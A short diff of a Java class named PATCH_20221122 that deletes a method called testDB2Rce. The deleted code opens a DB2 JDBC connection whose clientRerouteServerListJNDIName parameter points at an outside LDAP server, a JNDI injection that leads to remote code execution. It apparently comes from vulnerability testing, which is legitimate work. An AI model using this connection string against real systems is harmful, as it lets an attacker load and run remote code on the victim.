@@ -12,10 +12,6 @@ import org.apache.http.client.methods.HttpPost;
  */
 public class PATCH_20221122 {
 
-    public static void testDB2Rce() throws ClassNotFoundException, SQLException {
-        Class.forName("com.ibm.db2.jcc.DB2Driver");
-        DriverManager.getConnection("jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=ldap://10.58.120.200:1389/nco5cx");
-    }
 
     public static void main(String[] args) throws IOException {
 
